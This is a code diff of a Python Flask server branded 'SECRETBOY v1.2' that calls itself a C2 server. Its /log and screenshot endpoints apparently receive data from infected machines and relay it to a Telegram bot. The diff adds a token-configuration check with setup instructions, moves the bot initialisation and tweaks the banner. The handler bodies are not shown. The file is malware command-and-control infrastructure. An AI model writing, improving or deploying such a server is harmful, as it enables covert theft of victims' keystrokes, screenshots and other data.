@@ -2,13 +2,30 @@ import os
 import json
 import base64
 import telebot
+import sys
 from flask import Flask, request
 from flask_cors import CORS
 
 # --- CONFIG ---
-TOKEN = "TELEGRAM_TOKEN"
-CHAT_ID = "TELEGRAM_CHAT_ID"  
-bot = telebot.TeleBot(TOKEN)
+# Replace these with your real Telegram Bot credentials
+TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
+CHAT_ID = "YOUR_CHAT_ID_HERE"  
+
+def check_config():
+    """Checks if the bot token is configured and provides English instructions."""
+    if TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or ":" not in TOKEN:
+        print("\n" + "!"*60)
+        print("ERROR: TELEGRAM BOT TOKEN IS MISSING OR INVALID!")
+        print("!"*60)
+        print(f"\nHow to fix this:")
+        print(f"1. Open the file:  nano {os.path.basename(__file__)}")
+        print(f"2. Locate the line: TOKEN = \"{TOKEN}\"")
+        print(f"3. Replace it with your actual Bot Token from @BotFather.")
+        print(f"4. Replace CHAT_ID with your personal Telegram ID.")
+        print(f"5. Save and Exit: Press Ctrl+O, Enter, then Ctrl+X.")
+        print("\n" + "!"*60 + "\n")
+        sys.exit(1)
+
 app = Flask(__name__)
 CORS(app)
 
@@ -19,7 +36,7 @@ def show_banner():
   ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
   ███████╗█████╗  ██║     ██████╔╝█████╗     ██║   ██████╔╝██║   ██║ ╚████╔╝ 
   ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   ██╔══██╗██║   ██║  ╚██╔╝  
-  ███████║███████╗╚██████╗██║  ██║███████╗   ██║   ██████╔╝╚██████╔╝   ██║   
+  ███████║███████╗╚██████╗██║  ██║███████╗   ██║   ██████╔╝╚██████╔╝   ██║  
     """ + "\033[1;31m" + "\n           [ BY N0MERC ] [ SECRETBOY v1.2 ]\033[0m")
 
 @app.route('/log', methods=['POST'])
@@ -46,4 +63,9 @@ def handle_screenshot():
 
 if __name__ == "__main__":
     show_banner()
+    check_config() # This will stop execution if the token is not set
+    
+    # Initialize bot only after check passes
+    bot = telebot.TeleBot(TOKEN)
+    print(f"[*] C2 Server is starting on port 5000...")
     app.run(host='0.0.0.0', port=5000)
